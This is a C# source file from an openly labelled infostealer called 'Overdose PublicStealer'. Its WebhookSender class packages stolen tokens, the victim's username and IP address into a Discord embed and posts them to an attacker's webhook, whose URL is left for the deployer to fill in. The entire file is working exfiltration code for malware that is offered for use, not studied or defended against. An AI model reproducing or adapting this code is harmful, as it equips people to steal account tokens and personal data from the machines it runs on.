using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text.Json;
using Overdose_PublicStealer.Utils;
using Overdose_PublicStealer.Models; // Import models for the webhook structure

namespace Overdose_PublicStealer
{
    internal static class WebhookSender
    {
        // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
        private static readonly string webhookUrl = "UR_WEBHOOK_HERE";

        // Method to send token data to the Discord webhook
        internal static void SendTokens(List<string> tokens)
        {
            // Create a new embed object that will be sent as a part of the webhook payload
            var embed = new Embed
            {
                Title = "💊 Overdose PublicStealer Report 💊", // Title for the embed message
                Description = "Found some juicy tokens!", // Description for the embed message
                Color = 0x9B59B6, // Color code for the embed's border
                // Fields of the embed, including the username and IP address of the user
                Fields = new List<EmbedField>
                {
                    new EmbedField { Name = "👤 Username", Value = Environment.UserName, Inline = true }, // Shows the username of the victim
                    new EmbedField { Name = "🌐 IP Address", Value = NetworkUtils.GetIp(), Inline = true } // Shows the IP address of the victim
                },
                // Footer text to display at the bottom of the embed
                Footer = new EmbedFooter { Text = "Overdose Stealer | Created by OHAREF" }
            };

            // If tokens were found, add them to the embed
            if (tokens.Any())
            {
                for (int i = 0; i < tokens.Count; i++)
                {
                    embed.Fields.Add(new EmbedField
                    {
                        Name = $"🔑 Token {i + 1}", // Name of the field, representing each token
                        Value = $"`{tokens[i]}`", // The token value itself, enclosed in backticks for formatting
                        Inline = false // The field won't be inline with others
                    });
                }
            }
            else
            {
                // If no tokens were found, add a message stating that
                embed.Fields.Add(new EmbedField { Name = "🔑 Tokens", Value = "No tokens found.", Inline = false });
            }

            // Create a payload object and add the embed to it
            var payload = new WebhookPayload();
            payload.Embeds.Add(embed); // Add the embed to the payload

            // Serialize the payload object into JSON format for sending
            var jsonPayload = JsonSerializer.Serialize(payload);

            // Call the method to post the data to the webhook
            PostJson(webhookUrl, jsonPayload);
        }

        // Method to send JSON payload to the Discord webhook using a WebClient
        private static void PostJson(string uri, string jsonPayload)
        {
            try
            {
                // Create a new WebClient to send the HTTP request
                using (WebClient client = new WebClient())
                {
                    // Set the Content-Type header to application/json
                    client.Headers[HttpRequestHeader.ContentType] = "application/json";
                    // Send the POST request with the JSON payload
                    client.UploadString(uri, jsonPayload);
                }
            }
            catch (Exception ex)
            {
                // If an error occurs, print the error message
                Console.WriteLine($"Error posting webhook: {ex.Message}");
            }
        }
    }
}
